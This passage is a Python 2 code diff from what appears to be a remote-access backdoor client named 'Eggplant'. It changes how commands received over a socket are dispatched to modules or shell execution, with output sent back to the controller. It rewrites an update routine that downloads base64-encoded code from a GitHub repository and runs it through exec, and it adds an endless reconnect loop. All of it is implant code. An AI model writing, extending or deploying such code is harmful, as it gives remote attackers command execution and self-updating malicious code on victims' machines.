+                elif cmd in self.config['modules']:
+                    output = run_module(cmd, action) if action else run_module(cmd)
+
                 else:
-                    try:
-                        output = run_module(cmd, action) if action else run_module(cmd)
-                    except:
-                        p = subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
-                        output = str().join((p.communicate()))
+                    output = run_command(cmd, action) if action else run_command(cmd)
 
                 self._send(bytes(output), method=cmd)
                 
@@ -877,7 +903,7 @@ def install(package):
         'Install %s failed with error: %s' % (str(package), str(e))
 
 
-def configure():
+def dependencies():
     try:
         dependencies = dict({
                              'AES':'Crypto.Cipher',
@@ -907,30 +933,32 @@ def configure():
         return False
 
 def update():
-    try:
-        pull = get('https://api.github.com/repos/colental/AngryEggplant/contents').json()
-        for i in pull:
-            try:
-                if i.get('name').encode() == 'modules':
-                    recurse = i.get('git_url') + '?recursive=True'
-                    modules = get(recurse).json()
-                    for url in modules.get('tree'):
-                        info    = get(url.get('url')).json()
-                        code    = b64decode(info.get('content'))
-                        name    = os.path.splitext(info.get('path').encode())[0]
-                        module  = create_module(code, name)
-                        print "Module ['%s'] successfully loaded" % name
-            except: pass
-        return True
-    except Exception as e2:
-        print 'Reload modules - import code - returned error: %s' % str(e2)
-        return False
+    raw     = get(urls['modules']).json()
+    data    = b64decode(raw['content'])
+    modules = loads(data)
+    for module in modules['tree']:
+        try:
+            name, ext = os.path.splitext(module['path'])
+            if len(ext) and '__' not in name:
+                if name in sys.modules:
+                    print "Module %s successfully loaded" % name
+                else:
+                    print "Downloading module %s..." % name
+                    encoded = get(module['url']).json()['content']
+                    print "Module %s downloaded successfully" % name
+                    code = b64decode(encoded)
+                    create_module(code, name)
+                    print "Added module %s to standard module library" % name
+        except Exception as e:
+            print 'Update error: %s' % str(e)
+    return True
 
 def create_module(code, name):
     try:
         module = new_module(name)
         exec code in module.__dict__
         sys.modules[name] = module
+        globals()[name]   = module
         return module
     except: pass
     
@@ -939,20 +967,24 @@ def resource_path(relative_path):
 
 def main():
     while True:
-        configured = configure()
-        while configured:
-            updated = update()
-            while updated:
+        try:
+            configured = configure()
+            while configured:
                 try:
-                    e = Eggplant(debug=True)                
-                    e.run(e.socket)
-                except:
-                    print 'Reconnecting in 10...'        
+                    updated = update()
+                    while updated:
+                        try:
+                            e = Eggplant(debug=True)                
+                            e.run(e.socket)
+                        except Exception as e1:
+                            print 'Error: %s Reconnecting in 10...' % str(e1)     
+                            sleep(10)
+                except Exception as e2:
+                    print 'Error: %s Re-loading modules in 10...' % str(e2)
                     sleep(10)
-            print 'Re-loading modules in 10...'
-            sleep(10)
-        print 'Re-configuring in 10...'
-        sleep(10)
+        except Exception as e3:
+            print 'Error: %s re-configuring in 10...' % str(e3)
+            sleep(10) 
     
     
         
